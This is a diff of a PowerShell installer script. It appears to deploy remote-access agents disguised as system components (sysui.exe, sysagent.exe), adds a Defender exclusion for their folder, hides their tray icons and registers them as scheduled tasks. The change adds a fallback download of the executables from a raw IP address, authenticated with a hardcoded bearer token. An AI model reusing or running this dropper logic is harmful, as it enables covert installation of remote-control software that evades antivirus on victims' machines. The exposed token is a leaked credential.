@@ -9,8 +9,8 @@ Add-MpPreference -ExclusionPath "C:\appdata" -ErrorAction SilentlyContinue
 if (-not $v1 -and -not $v2) { $v1 = $true; $v2 = $true }
 
 $agents = @()
-if ($v1) { $agents += @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; Args='-notray' } }
-if ($v2) { $agents += @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; Args='-notray' } }
+if ($v1) { $agents += @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Relay='sysui.exe'; Port=8081; Args='-notray' } }
+if ($v2) { $agents += @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Relay='daljinac2.exe'; Port=1984; Args='-notray' } }
 
 Write-Host "=== Cleanup ===" -ForegroundColor Cyan
 @("daljinac","daljinacWatch","daljinac2","daljinac2Watch",
@@ -45,12 +45,20 @@ foreach ($a in $agents) {
     Write-Host "  [2/3] Downloading..."
     mkdir $a.Dir -Force | Out-Null
     $downloaded = $false
-    for ($retry = 1; $retry -le 3; $retry++) {
-        try {
-            Invoke-WebRequest $a.URL -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
-            $sz = (Get-Item "$Exe.new").Length
-            if ($sz -gt 100000) { Write-Host "         $sz bytes (attempt $retry)" -ForegroundColor Green; $downloaded = $true; break }
-        } catch { Write-Host "         retry $retry..." -ForegroundColor Yellow; Start-Sleep 2 }
+    $sources = @($a.URL)
+    if ($a.Relay) { $sources += "http://31.220.74.109:9999/$($a.Relay)" }
+    foreach ($src in $sources) {
+        $from = if ($src -match "github") { "GitHub" } else { "relay" }
+        for ($retry = 1; $retry -le 2; $retry++) {
+            try {
+                $h = @{}
+                if ($src -match "^http://31.220.74.109") { $h.Authorization = "Bearer 916de2678b4319090a640799f7ca7a6e" }
+                Invoke-WebRequest $src -Headers $h -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
+                $sz = (Get-Item "$Exe.new").Length
+                if ($sz -gt 100000) { Write-Host "         $sz bytes ($from)" -ForegroundColor Green; $downloaded = $true; break }
+            } catch { if ($retry -lt 2) { Write-Host "         $from retry..." -ForegroundColor Yellow; Start-Sleep 2 } }
+        }
+        if ($downloaded) { break }
     }
     if (-not $downloaded) { Write-Host "         FAILED" -ForegroundColor Red; continue }
 
